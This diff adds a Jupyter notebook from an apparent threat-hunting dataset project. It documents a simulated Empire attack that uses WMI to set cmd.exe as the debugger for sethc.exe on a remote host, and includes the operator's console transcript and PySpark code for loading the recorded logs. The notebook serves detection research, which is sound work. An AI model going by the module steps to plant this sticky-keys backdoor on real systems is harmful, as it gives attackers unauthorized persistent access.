@@ -1,0 +1,230 @@
+{
+ "cells": [
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "# Empire Invoke WMI Debugger"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "## Metadata"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "\n",
+    "|                   |    |\n",
+    "|:------------------|:---|\n",
+    "| id                | SDWIN-190518215622 |\n",
+    "| author            | Roberto Rodriguez @Cyb3rWard0g |\n",
+    "| creation date     | 2019/05/18 |\n",
+    "| platform          | Windows |\n",
+    "| Mordor Environment| Mordor shire |\n",
+    "| Simulation Type   | C2 |\n",
+    "| Simulation Tool   | Empire |\n",
+    "| Simulation Script | https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/lateral_movement/Invoke-PsExec.ps1 |\n",
+    "| Mordor Dataset    | https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_invoke_wmi_debugger.tar.gz |"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "## Dataset Description\n",
+    "This dataset represents adversaries using WMI to set the debugger for a target binary on a remote machine. Setting sethc.exe to be C:\\Windows\\System32\\cmd.exe"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "## Adversary View\n",
+    "```\n",
+    "(Empire: V6W3TH8Y) > usemodule lateral_movement/invoke_wmi_debugger\n",
+    "(Empire: powershell/lateral_movement/invoke_wmi_debugger) > info\n",
+    "\n",
+    "              Name: Invoke-WMIDebugger\n",
+    "            Module: powershell/lateral_movement/invoke_wmi_debugger\n",
+    "        NeedsAdmin: False\n",
+    "        OpsecSafe: False\n",
+    "          Language: powershell\n",
+    "MinLanguageVersion: 2\n",
+    "        Background: False\n",
+    "  OutputExtension: None\n",
+    "\n",
+    "Authors:\n",
+    "  @harmj0y\n",
+    "\n",
+    "Description:\n",
+    "  Uses WMI to set the debugger for a target binary on a remote\n",
+    "  machine to be cmd.exe or a stager.\n",
+    "\n",
+    "Options:\n",
+    "\n",
+    "  Name         Required    Value                     Description\n",
+    "  ----         --------    -------                   -----------\n",
+    "  Listener     False                                 Listener to use.                        \n",
+    "  CredID       False                                 CredID from the store to use.           \n",
+    "  ComputerName True                                  Host[s] to execute the stager on, comma \n",
+    "                                                    separated.                              \n",
+    "  Cleanup      False                                 Switch. Disable the debugger for the    \n",
+    "                                                    specified TargetBinary.                 \n",
+    "  TargetBinary True        sethc.exe                 Target binary to set the debugger for   \n",
+    "                                                    (sethc.exe, Utilman.exe, osk.exe,       \n",
+    "                                                    Narrator.exe, or Magnify.exe)           \n",
+    "  UserName     False                                 [domain\\]username to use to execute     \n",
+    "                                                    command.                                \n",
+    "  Binary       False       C:\\Windows\\System32\\cmd.  Binary to set for the debugger.         \n",
+    "                          exe                     \n",
+    "  RegPath      False       HKLM:Software\\Microsoft\\  Registry location to store the script   \n",
+    "                          Network\\debug             code. Last element is the key name.     \n",
+    "  Password     False                                 Password to use to execute command.     \n",
+    "  Agent        True        V6W3TH8Y                  Agent to run module on.                 \n",
+    "\n",
+    "(Empire: powershell/lateral_movement/invoke_wmi_debugger) > set Listener https\n",
+    "(Empire: powershell/lateral_movement/invoke_wmi_debugger) > set ComputerName IT001.shire.com\n",
+    "(Empire: powershell/lateral_movement/invoke_wmi_debugger) > set Listener ''\n",
+    "(Empire: powershell/lateral_movement/invoke_wmi_debugger) > info\n",
+    "\n",
+    "              Name: Invoke-WMIDebugger\n",
+    "            Module: powershell/lateral_movement/invoke_wmi_debugger\n",
+    "        NeedsAdmin: False\n",
+    "        OpsecSafe: False\n",
+    "          Language: powershell\n",
+    "MinLanguageVersion: 2\n",
+    "        Background: False\n",
+    "  OutputExtension: None\n",
+    "\n",
+    "Authors:\n",
+    "  @harmj0y\n",
+    "\n",
+    "Description:\n",
+    "  Uses WMI to set the debugger for a target binary on a remote\n",
+    "  machine to be cmd.exe or a stager.\n",
+    "\n",
+    "Options:\n",
+    "\n",
+    "  Name         Required    Value                     Description\n",
+    "  ----         --------    -------                   -----------\n",
+    "  Listener     False                                 Listener to use.                        \n",
+    "  CredID       False                                 CredID from the store to use.           \n",
+    "  ComputerName True        IT001.shire.com           Host[s] to execute the stager on, comma \n",
+    "                                                    separated.                              \n",
+    "  Cleanup      False                                 Switch. Disable the debugger for the    \n",
+    "                                                    specified TargetBinary.                 \n",
+    "  TargetBinary True        sethc.exe                 Target binary to set the debugger for   \n",
+    "                                                    (sethc.exe, Utilman.exe, osk.exe,       \n",
+    "                                                    Narrator.exe, or Magnify.exe)           \n",
+    "  UserName     False                                 [domain\\]username to use to execute     \n",
+    "                                                    command.                                \n",
+    "  Binary       False       C:\\Windows\\System32\\cmd.  Binary to set for the debugger.         \n",
+    "                          exe                     \n",
+    "  RegPath      False       HKLM:Software\\Microsoft\\  Registry location to store the script   \n",
+    "                          Network\\debug             code. Last element is the key name.     \n",
+    "  Password     False                                 Password to use to execute command.     \n",
+    "  Agent        True        V6W3TH8Y                  Agent to run module on.                 \n",
+    "\n",
+    "(Empire: powershell/lateral_movement/invoke_wmi_debugger) > execute                                          \n",
+    "[>] Module is not opsec safe, run? [y/N] y\n",
+    "[*] Tasked V6W3TH8Y to run TASK_CMD_WAIT\n",
+    "[*] Agent V6W3TH8Y tasked with task ID 7\n",
+    "[*] Tasked agent V6W3TH8Y to run module powershell/lateral_movement/invoke_wmi_debugger\n",
+    "(Empire: powershell/lateral_movement/invoke_wmi_debugger) > Invoke-Wmi executed on \"IT001.shire.com\" to set the debugger for sethc.exe to be C:\\Windows\\System32\\cmd.exe.\n",
+    "\n",
+    "(Empire: powershell/lateral_movement/invoke_wmi_debugger) >\n",
+    "```"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "## Explore Mordor Dataset"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "### Initialize Analytics Engine"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "from openhunt.mordorutils import *\n",
+    "spark = get_spark()"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "### Download & Process Mordor File"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "mordor_file = \"https://raw.githubusercontent.com/hunters-forge/mordor/master/datasets/small/windows/execution/empire_invoke_wmi_debugger.tar.gz\"\n",
+    "registerMordorSQLTable(spark, mordor_file, \"mordorTable\")"
+   ]
+  },
+  {
+   "cell_type": "markdown",
+   "metadata": {},
+   "source": [
+    "### Get to know your data"
+   ]
+  },
+  {
+   "cell_type": "code",
+   "execution_count": null,
+   "metadata": {},
+   "outputs": [],
+   "source": [
+    "df = spark.sql(\n",
+    "    '''\n",
+    "SELECT *\n",
+    "FROM mordorTable\n",
+    "    '''\n",
+    ")\n",
+    "df.printSchema()\n",
+    "        "
+   ]
+  }
+ ],
+ "metadata": {
+  "kernelspec": {
+   "display_name": "PySpark_Python3",
+   "language": "python",
+   "name": "pyspark3"
+  },
+  "language_info": {
+   "codemirror_mode": {
+    "name": "ipython",
+    "version": 3
+   },
+   "file_extension": ".py",
+   "mimetype": "text/x-python",
+   "name": "python",
+   "nbconvert_exporter": "python",
+   "pygments_lexer": "ipython3",
+   "version": "3.7.3"
+  }
+ },
+ "nbformat": 4,
+ "nbformat_minor": 4
+}
